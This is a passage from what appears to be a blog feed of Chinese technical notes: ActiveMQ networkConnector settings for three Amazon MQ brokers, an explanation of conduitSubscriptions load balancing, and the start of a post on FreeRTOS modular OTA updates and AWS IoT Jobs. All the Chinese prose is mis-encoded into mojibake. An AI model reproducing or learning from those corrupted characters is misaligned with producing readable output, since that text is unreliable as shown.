&lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker2 ä¸Šé¢çš„ <networkConnectors> è¨­ç½®</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker3 ä¸Šé¢çš„ <networkConnectors> è¨­ç½®</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><h3 id="conduitSubscriptions-å±¬æ€§"><a href="#conduitSubscriptions-å±¬æ€§" class="headerlink" title="conduitSubscriptions å±¬æ€§"></a>conduitSubscriptions å±¬æ€§</h3><p>æ ¹æ“š ActiveMQ å®˜æ–¹æ–‡ä»¶ </p><blockquote><p><a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p></blockquote><p><img src="/img/ActiveMQ/ActiveMQ9.png"></p><p>è¨‚é–±ç›¸åŒç›®çš„åœ°çš„å¤šä½æ¶ˆè²»è€…è¢«ç¶²è·¯è¦–ç‚ºä¸€å€‹æ¶ˆè²»è€…ï¼Œé€™æ˜¯ç‚ºäº†é¿å…æœ‰æ”¶åˆ°ç›¸åŒæ¶ˆæ¯çš„ç‹€æ³</p><p>ActiveMQ æœƒä¾è³´æœ‰é—œæ´»å‹•æ¶ˆè²»è€…ï¼ˆè¨‚é–±è€…ï¼‰çš„è³‡è¨Šä¾†åœ¨ç¶²çµ¡ä¸­å‚³éè¨Šæ¯ï¼Œ<strong>ä½¿ç”¨ Conduit Subscriptionæ™‚ï¼Œå¦‚æœæœ‰å¤šå€‹é ç«¯è¨‚é–±ï¼Œé ç¨‹ä»£ç†å°‡æ¯å€‹æ¶ˆæ¯çš„å‰¯æœ¬è¦–ç‚ºæœ‰æ•ˆï¼Œé€™å¯èƒ½å°è‡´è¨Šæ¯é‡å¾©çš„ç‹€æ³ç”¢ç”Ÿ</strong>ã€‚</p><p>å› æ­¤ï¼Œé è¨­çš„ Conduit è¡Œç‚ºæœƒå»<strong>æ•´åˆæ‰€æœ‰åŒ¹é…çš„è¨‚é–±è¨Šæ¯ï¼Œä»¥é˜²æ­¢åœ¨ç¶²çµ¡ä¸­å‚³æ’­é‡è¤‡</strong>ã€‚</p><p>é€™æ¨£ï¼Œé ç¨‹ä»£ç†ä¸Šçš„ <code>N</code> å€‹è¨‚é–±çœ‹èµ·ä¾†å°æ–¼ç¶²çµ¡ä»£ç†ä¾†èªªå°±åƒæ˜¯ä¸€å€‹å–®ä¸€çš„è¨‚é–±ã€‚</p><blockquote><p>ç„¶è€Œï¼Œå¦‚æœåªä½¿ç”¨ Queueï¼Œé‡è¤‡çš„è¨‚é–±æ˜¯ä¸€å€‹æœ‰ç”¨çš„åŠŸèƒ½ï¼Œå› ç‚ºè² è¼‰å¹³è¡¡ç®—æ³•å°‡å˜—è©¦å‡å‹»åˆ†é…æ¶ˆæ¯è² è¼‰ï¼Œåƒ…ç•¶ <code>conduitSubscriptions=false</code> æ™‚ï¼Œè·¨ç¶²çµ¡çš„æ¶ˆè²»è€…æ‰æœƒå‡å‹»åˆ†äº«æ¶ˆæ¯è² è¼‰ã€‚</p></blockquote><p>èˆ‰ä¾‹ä¾†èªªï¼Œæœ‰å…©å€‹ä»£ç†ï¼ŒA å’Œ Bï¼Œå®ƒå€‘é€šéä¸€å€‹ proxy bridge ç›¸äº’é€£æ¥ã€‚</p><p>é€£æ¥åˆ°ä»£ç† A çš„æ¶ˆè²»è€…è¨‚é–±ä¸€å€‹åç‚º <code>Q.TEST</code> çš„Queueï¼Œé€£æ¥åˆ°ä»£ç† B çš„å…©å€‹æ¶ˆè²»è€…ä¹Ÿè¨‚é–± <code>Q.TEST</code>ï¼Œæ‰€ä»¥é€™è£¡æœ‰ä¸‰å€‹æ¶ˆè²»è€…ï¼Œä¸¦ä¸”å‡è¨­æ‰€æœ‰æ¶ˆè²»è€…å…·æœ‰ç›¸ç­‰çš„å„ªå…ˆç´šã€‚</p><p>ç„¶å¾Œï¼Œåœ¨ä»£ç† A ä¸Šå•Ÿå‹•ä¸€å€‹ç”Ÿç”¢è€…ï¼Œå°‡ 30 æ¢æ¶ˆæ¯å¯«å…¥ <code>Q.TEST</code>ã€‚é»˜èªæƒ…æ³ä¸‹ï¼ˆ<code>conduitSubscriptions=true</code>ï¼‰ï¼Œå°‡æœ‰ 15 æ¢æ¶ˆæ¯ç™¼é€åˆ°ä»£ç† A ä¸Šçš„æ¶ˆè²»è€…ï¼Œå…¶é¤˜çš„ 15 æ¢æ¶ˆæ¯å°‡ç™¼é€åˆ°ä»£ç† B ä¸Šçš„å…©å€‹æ¶ˆè²»è€…ã€‚</p><p><strong>ä½†ä¹Ÿç”±æ–¼é è¨­ç‹€æ³ä¸‹ï¼Œä»£ç† A å°‡ä»£ç† B ä¸Šçš„å…©å€‹è¨‚é–±è¦–ç‚ºä¸€å€‹ï¼Œæ¶ˆæ¯è² è¼‰ä¸¦æœªå‡å‹»åˆ†ä½ˆåœ¨æ‰€æœ‰ä¸‰å€‹æ¶ˆè²»è€…ä¹‹é–“ã€‚</strong></p><p>ä½†å¦‚æœä½ å°‡ <code>conduitSubscriptions</code> è¨­ç½®ç‚º <code>false</code>ï¼Œé‚£éº¼ä¸‰å€‹æ¶ˆè²»è€…ä¸­çš„æ¯å€‹å°‡åˆ†é…åˆ° 10 æ¢æ¶ˆæ¯ã€‚</p><h2 id="åƒè€ƒ"><a href="#åƒè€ƒ" class="headerlink" title="åƒè€ƒ"></a>åƒè€ƒ</h2><p>[+] åŸ·è¡Œå€‹é«”é¡å‹ - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a><br>[+] Amazon MQ ä»£ç†ç½‘ç»œ - ä»£ç†ç½‘ç»œçš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ - <a href="https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work">https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work</a><br>[+]ActiveMQ - NetworkConnectors - <a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> ActiveMQ </tag>
            
            <tag> MQ </tag>
            
            <tag> Scaling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å­¸ç¿’ç­†è¨˜ã€‘OTA Update -1</title>
      <link href="/posts/613d9ed0.html"/>
      <url>/posts/613d9ed0.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€éº¼æ˜¯-OTA-Update-Over-The-Air-Updtae"><a href="#ä»€éº¼æ˜¯-OTA-Update-Over-The-Air-Updtae" class="headerlink" title="ä»€éº¼æ˜¯ OTA Update (Over The Air Updtae)?"></a>ä»€éº¼æ˜¯ OTA Update (Over The Air Updtae)?</h2><p>é€éç„¡ç·šé€šè¨Šå»å°è¨­å‚™é€²è¡Œè»Ÿé«”&#x2F;éŸŒé«”æ›´æ–°</p><h2 id="OTA-çš„æµç¨‹"><a href="#OTA-çš„æµç¨‹" class="headerlink" title="OTA çš„æµç¨‹"></a>OTA çš„æµç¨‹</h2><ul><li>Notify<ul><li>è¨­å‚™æœƒè¢«é€šçŸ¥æœ‰æ“±ç½®çš„OTAæ›´æ–°</li><li>è¨­å‚™å¯ä»¥é¸æ“‡å¿½ç•¥æ›´æ–°æˆ–è€…æ¥å—æ›´æ–°ä»¥è§¸ç™¼ä¸‹è¼‰</li></ul></li><li>Download<ul><li>è¨­å‚™é€šéå„ç¨®æ”¯æ´çš„å”å®šé€²è¡Œæ›´æ–°ä¸‹è¼‰</li><li>æ›´æ–°åŒ…æœƒä¸‹è¼‰åˆ°é å…ˆè¨­å®šå¥½çš„å„²å­˜å€åŸŸ<ul><li>Ex. S3 Bucket</li></ul></li><li>æ›´æ–°å¯èƒ½æ˜¯å…¨æ–°çš„éŸŒé«”æ˜ åƒæˆ–ç¾æœ‰éŸŒé«”çš„è£œä¸</li></ul></li><li>Verify<ul><li>é©—è­‰æ›´æ–°åŒ…çš„æœ‰æ•ˆæ€§</li></ul></li><li>Install<ul><li>è¨­å‚™é€šéæ›´æ–°åŒ…é–‹å§‹æ›´æ–°ï¼ˆé€šå¸¸æ˜¯é€šé bootloaderï¼‰æˆæœ€æ–°çš„éŸŒé«”</li><li>å®‰è£å¾Œå¯ä»¥åŸ·è¡Œæª¢æŸ¥ä»¥é©—è­‰åŠŸèƒ½</li><li>è¨­å‚™å°‡å‘ OTA æ›´æ–°æä¾›è€…å ±å‘ŠéŸŒé«”æ›´æ–°æˆåŠŸ</li></ul></li></ul><p>ä¸»è¦åˆ†æˆé€™å››å€‹æ­¥é©Ÿ</p><h2 id="æ¨¡çµ„åŒ–-OTA-æ›´æ–°"><a href="#æ¨¡çµ„åŒ–-OTA-æ›´æ–°" class="headerlink" title="æ¨¡çµ„åŒ– OTA æ›´æ–°"></a>æ¨¡çµ„åŒ– OTA æ›´æ–°</h2><ul><li>æ¨¡çµ„åŒ– OTA ç”±å¹¾å€‹å°å‹å‡½å¼åº«å’Œä¸€å€‹å”èª¿å™¨(Orchestrator)çµ„æˆã€‚</li><li>æ¯å€‹ Lib è² è²¬ç‰¹å®šçš„å­ä»»å‹™ï¼Œä¾‹å¦‚é€šçŸ¥å¾…è™•ç†çš„ OTA æ›´æ–°æˆ–é€é MQTT ä¸‹è¼‰æª”æ¡ˆ</li><li>ç·¨æ’å™¨å°‡æ‰€æœ‰å°å‹ç¨‹å¼åº«èˆ‡bootloader å’Œ Memory Pool åŒæ­¥ä»¥åŸ·è¡Œ OTA æ›´æ–°ã€‚</li></ul><p>æ¨¡çµ„åŒ– OTA æ–¹æ³•å¯è®“æ‚¨æ ¹æ“šéœ€æ±‚çš„è®ŠåŒ–æ›´æ›æˆ–æ›´æ”¹ OTA çš„ä¸åŒéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼š</p><ol><li>å¦‚æœæ‚¨æƒ³å¾ AWS IoT è§¸ç™¼ OTAï¼Œå‰‡å¯ä»¥ä½¿ç”¨ IoT Job Libæª¢æŸ¥æ–°çš„ OTA æ›´æ–°æˆ–å‚³é€æœ‰é—œ OTA Jobs ç‹€æ…‹çš„é€šçŸ¥ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥å°‡å…¶æ›¿æ›ç‚ºä»»ä½•å…¶ä»–å…¶ä»–çš„ç¨‹å¼åº«ã€‚</li><li>å¯ä»¥ä½¿ç”¨IoT Job Lib ä¸­çš„ <strong>OTA Job Parser</strong> ä¾†è§£ææ¥æ”¶åˆ°çš„OTAJob Documentã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥æ ¹æ“š OTA Job Document ä½¿ç”¨è‡ªå·±è‡ªè¨‚çš„ Job Document Parserã€‚</li></ol><h2 id="æ¨¡çµ„åŒ–-OTA-æ›´æ–°æµç¨‹"><a href="#æ¨¡çµ„åŒ–-OTA-æ›´æ–°æµç¨‹" class="headerlink" title="æ¨¡çµ„åŒ– OTA æ›´æ–°æµç¨‹"></a>æ¨¡çµ„åŒ– OTA æ›´æ–°æµç¨‹</h2><p>ä»¥ä¸‹æ˜¯æ ¹æ“š FreeRTOS å®˜ç¶²æä¾›çš„æ¨¡çµ„åŒ– OTAæ›´æ–°çš„æµç¨‹</p><p><img src="https://hackmd.io/_uploads/Sk_CRjSB6.png" alt="image"></p><h2 id="å”èª¿å™¨ï¼ˆOrchestratorï¼‰"><a href="#å”èª¿å™¨ï¼ˆOrchestratorï¼‰" class="headerlink" title="å”èª¿å™¨ï¼ˆOrchestratorï¼‰"></a>å”èª¿å™¨ï¼ˆOrchestratorï¼‰</h2><ul><li>Orchestrator æ˜¯æŒ‡å®šå¦‚ä½•å”èª¿ OTA æ›´æ–°çš„æ ¸å¿ƒå…ƒä»¶</li><li>Orchestrator ç”±ä½¿ç”¨è€…æä¾›ï¼Œä¸¦åŒ…å«æ‰€éœ€æ•¸é‡çš„è‡ªè¨‚å…ƒä»¶ï¼Œä»¥å®Œæˆæ‰€éœ€çš„ OTA æ›´æ–°æ–¹æ³•</li><li>å…¸å‹çš„æ›´æ–°å°‡åŒ…å«ã€Œé€šçŸ¥ã€ã€ã€Œä¸‹è¼‰ã€ã€ã€Œé©—è­‰ã€å’Œã€Œå®‰è£ã€éšæ®µã€‚ </li><li>Orchestrator å°‡é€éå°‡å…ƒä»¶å‡½å¼åº«å’Œå…¶ä»–å¤–éƒ¨å‡½å¼åº«æ‹¼æ¥åœ¨ä¸€èµ·ä¾†æä¾›é€™äº›éšæ®µ</li><li>æ¯å€‹å…ƒä»¶å‡½å¼åº«çš„æè¿°å¯ä»¥åœ¨ä¸‹é¢æ‰¾åˆ°</li></ul><h2 id="IoT-Job-Libraries"><a href="#IoT-Job-Libraries" class="headerlink" title="IoT Job Libraries"></a>IoT Job Libraries</h2><ul><li>IoT Job Handler æœƒæ˜¯æ•´å€‹ OTA Flow ç•¶ä¸­ç¬¬ä¸€å€‹ä½¿ç”¨åˆ°çš„å…ƒä»¶</li><li>é€™å€‹å‡½å¼åº«æä¾›äº†å•Ÿå‹•å¾…è™•ç†çš„ IoT ä½œæ¥­ä»¥åŠæ›´æ–°ä½œæ¥­ç‹€æ…‹çš„åŠŸèƒ½</li><li>ç•¶ä½œæ¥­è™•ç†ç¨‹åºç²æ‚‰æ–°çš„ OTA æ›´æ–°ï¼ˆé€é IoT Job é€²è¡Œï¼‰æ™‚ï¼Œè™•ç†ç¨‹åºå°‡å•Ÿå‹• Job ä¸¦å°‡ Job åŠå…¶ metadata å‚³éåˆ°è§£æå™¨éˆ</li><li>å¦‚æœè¨­å®šäº†è§£æå™¨ä¾†è™•ç†è©² Job ï¼Œå®ƒå°‡å‘ Job Handler è½‰é€ Job å·²æˆåŠŸå•Ÿå‹•çš„è³‡è¨Š</li><li>æ­¤æˆåŠŸå•Ÿå‹•é€šçŸ¥å°‡è½‰ç™¼å› OTA æ›´æ–°æä¾›è€…ï¼ˆå³ IoT Jobsï¼‰ï¼Œä»¥å°‡æ›´æ–°æ¨™è¨˜ç‚ºå·²å•Ÿå‹•ã€‚å¦‚æœæ²’æœ‰è§£æå™¨èƒ½å¤ ç†è§£è©²ä½œæ¥­ï¼Œå‰‡å•Ÿå‹• OTA æ›´æ–°çš„å¤±æ•—å°‡è½‰ç™¼çµ¦æä¾›è€…</li></ul><h2 id="OTA-Job-Parser"><a href="#OTA-Job-Parser" class="headerlink" title="OTA Job Parser"></a>OTA Job Parser</h2><p>è§£æå™¨å°‡é©—è­‰ IoT ä½œæ¥­æ˜¯å¦ç‚º OTA æ›´æ–°ï¼Œä¸¦åœ¨å‘¼å«ä¸‹è¼‰å™¨ä¹‹å‰å°‡æ¬„ä½è§£æç‚ºå¯ç”¨æ ¼å¼</p><h2 id="MQTT-file-streaming-library"><a href="#MQTT-file-streaming-library" class="headerlink" title="MQTT file streaming library"></a>MQTT file streaming library</h2><ul><li>æ–‡ä»¶ä¸‹è¼‰å™¨æä¾›ä¸‹è¼‰ OTA æª”æ¡ˆçš„åŠŸèƒ½ã€‚æª”æ¡ˆä¸‹è¼‰å™¨é€é CBOR æˆ– JSON æ ¼å¼çš„ MQTT Stream è™•ç†ä¸‹è¼‰æ›´æ–°</li><li>ä¸‹è¼‰æœ¬èº«æ˜¯åœ¨ Chunk ä¸ŠåŸ·è¡Œçš„ï¼Œé€™æ›´å®¹æ˜“è¢«è¦–ç‚ºæ•´å€‹ OTA æ›´æ–°æª”æ¡ˆçš„å€å¡Šã€‚é€™æ¨£åšæ˜¯ç‚ºäº†æé«˜ä¸‹è¼‰çš„å¯é æ€§ï¼Œä¸¦å…è¨±æ¯”å–®ä¸€ä¸‹è¼‰ã€Œå€å¡Šã€ä¸­å¯èƒ½é€²è¡Œçš„æ›´å¤§çš„éŸŒé«”æ›´æ–°ã€‚</li></ul><h2 id="Bootloader-and-Signature-Verifier"><a href="#Bootloader-and-Signature-Verifier" class="headerlink" title="Bootloader and Signature Verifier"></a>Bootloader and Signature Verifier</h2><ul><li>bootloader çš„å­˜åœ¨æ˜¯ç‚ºäº†é©—è­‰æ–°éŸŒé«”ä¸¦å°‡å…¶å®‰è£åˆ°è£ç½®ä¸Š</li><li>æ¨¡çµ„åŒ– OTA åˆ»æ„é¿å…å¯¦æ–½ bootloaderï¼Œå› ç‚ºå·²ç¶“å­˜åœ¨é©ç”¨æ–¼å¤§é‡å—æ”¯æ´å¾®æ§åˆ¶å™¨çš„å¤šå€‹è¡Œæ¥­ç¯„åœçš„ bootloader</li><li>æ¨¡çµ„åŒ– OTA å°‡ bootloaderå’Œç°½ç« é©—è­‰æ©Ÿåˆ¶çš„é¸æ“‡ç•™çµ¦ä½¿ç”¨è€…ã€‚</li></ul><h2 id="AWS-IoT-Jobs-ä»¥åŠ-AWS-IoT-OTA-Updateå·®ç•°"><a href="#AWS-IoT-Jobs-ä»¥åŠ-AWS-IoT-OTA-Updateå·®ç•°" class="headerlink" title="AWS IoT Jobs ä»¥åŠ AWS IoT OTA Updateå·®ç•°"></a>AWS IoT Jobs ä»¥åŠ AWS IoT OTA Updateå·®ç•°</h2><ul><li>AWS IoT Jobs<ul><li>å®šç¾©ä¸€çµ„å¯ä»¥ç™¼é€åˆ°ä¸€å€‹æˆ–å¤šå€‹è¨­å‚™ä¸¦åœ¨å…¶ä¸Šé‹è¡Œçš„é ç«¯æ“ä½œ</li><li>æœ€å¸¸è¦‹çš„æ˜¯ï¼Œä½œæ¥­ç”¨æ–¼åŸ·è¡Œè»Ÿé«”æˆ–éŸŒé«”æ›´æ–°ï¼Œä½†ä¹Ÿå¯ç”¨æ–¼åŸ·è¡Œä»»ä½•ä»»æ„æ“ä½œï¼Œä¾‹å¦‚é‡æ–°å•Ÿå‹•ã€æ†‘è­‰ Rotateç­‰</li></ul></li><li>AWS IoT OTA Update<ul><li>åŸºæ–¼ AWS IoT Jobs å»ºç½®çš„åŠŸèƒ½ï¼Œå°ˆé–€å¯¦ç¾è»Ÿé«”&#x2F;éŸŒé«”æ›´æ–°æ“ä½œï¼Œä¸¦ä¸”åƒ…å¯¦ç¾è©²æ“ä½œ</li><li>OTA æ›´æ–°æ˜¯ä¸€é … Jobï¼Œ<strong>ä½†æœ‰é å…ˆå®šç¾©çš„ Jobæ–‡ä»¶</strong>ã€‚å®ƒæ†ç¶äº†å¸¸è¦‹çš„è»Ÿé«”æ›´æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚ç¨‹å¼ç¢¼ç°½ç½²ï¼‰ï¼Œå¯ä»¥èƒ½å¤ æ›´å¿«å»ºç«‹è»Ÿé«”æ›´æ–°è§£æ±ºæ–¹æ¡ˆ</li></ul></li></ul><p>æ¯”è¼ƒè¡¨æ ¼</p><table><thead><tr><th></th><th>AWS IoT Jobs</th><th>AWS IoT OTA Updates</th></tr></thead><tbody><tr><td>ç”¨é€”</td><td>ä»»ä½•è‡ªå®šç¾©çš„è¡Œç‚º</td><td>FreeRTOS OTA update</td></tr><tr><td>Job æ–‡ä»¶</td><td>å¯è‡ªå®šç¾©</td><td>é å…ˆå®šç¾©</td></tr><tr><td>å»ºç«‹çš„ 